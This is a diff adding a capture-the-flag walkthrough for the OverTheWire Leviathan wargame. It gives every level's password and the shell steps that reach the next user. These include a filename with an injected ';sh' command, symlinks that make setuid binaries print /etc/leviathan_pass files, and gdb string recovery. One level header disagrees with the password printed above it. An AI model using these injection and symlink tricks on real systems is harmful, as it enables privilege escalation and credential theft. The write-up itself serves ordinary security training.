@@ -1,0 +1,100 @@
+=========================================================================
+                               LEVIATHAN
+=========================================================================
+
+
+    Connection : ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+
+(Binaries of every level is present in Bianry Directory.)
+
+leviathan0 : leviathan0
+ ( cd '.backup' ; 
+   cat bookmarks.html | grep leviathan ; )
+leviathan1 : rioGegei8m
+ ( gdb check ; # Analysis the strings.
+    disassemble main ; 
+
+    (gdb) x/s $ebp-0x10
+    0xffffd6a8:	"sex"
+    (gdb) x/s $ebp-0x17
+    0xffffd6a1:	"secret"
+    (gdb) x/s $ebp-0x1b
+	0xffffd69d:	"god"
+	(gdb) x/s $ebp-0x20
+	0xffffd698:	"love"
+
+  leviathan1@leviathan:~$ ./check
+  password: sex secret god love
+  $    :) Boom i got the shell having higher privillages.
+  $ whoami
+  leviathan2
+  $ cat /etc/leviathan_pass/leviathan2
+
+    )
+leviathan2 : ougahZi8Ta   <-  MOST INTRESTING LEVEL
+ ( # Method 1 : 
+
+   touch "/tmp/testdprpd;sh"
+   leviathan2@leviathan:/tmp$ ~/printfile "/tmp/testdprpd;sh"
+    /bin/cat: /tmp/testdprpd: No such file or directory
+   $ whoami
+   leviathan3
+   $ cat /etc/leviathan_pass/leviathan3
+   Ahdiemoo1j
+
+  # Method 2 : 
+
+   in /tmp directory
+   ln -s /etc/leviathan_pass/leviathan3 pro
+   touch "pro pre"
+   ~/printfile "/tmp/pro pre"
+   Ahdiemoo1j
+
+)
+leviathan3 : Ahdiemoo1j
+ ( 
+
+  leviathan3@leviathan:~$ ls
+  level3
+  leviathan3@leviathan:~$ ./level3 
+  Enter the password> snlprintf
+  [You've got shell]!
+  $ whoami
+  leviathan4
+  $ cat /etc/leviathan_pass/leviathan4
+  vuH0coox6m
+
+ )
+leviathan4 : vuH0coox6m
+ ( 
+    01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+    python3 leviathan4.py -> Tith4cokei
+     )
+leviathan5 : Tith4cokei
+ ( 
+   leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log 
+   leviathan5@leviathan:~$ ./leviathan5 
+   UgaoFee4li   )
+leviathan6 : UgaoFee4li
+ (  
+
+   0x1bd3 -> 7123
+   leviathan6@leviathan:~$ ./leviathan6 7123
+   $ whoami
+   leviathan7
+   $ cat /etc/leviathan_pass/leviathan7
+   ahy7MaeBo9
+
+ )
+leviathan7 : ahy7MaeBo
+
+  leviathan7@leviathan:~$ ls
+  CONGRATULATIONS
+  leviathan7@leviathan:~$ cat CONGRATULATIONS 
+
+
+===========================================================================================================
+
+         Well Done, you seem to have used a *nix system before, now try something more serious.
+
+===========================================================================================================
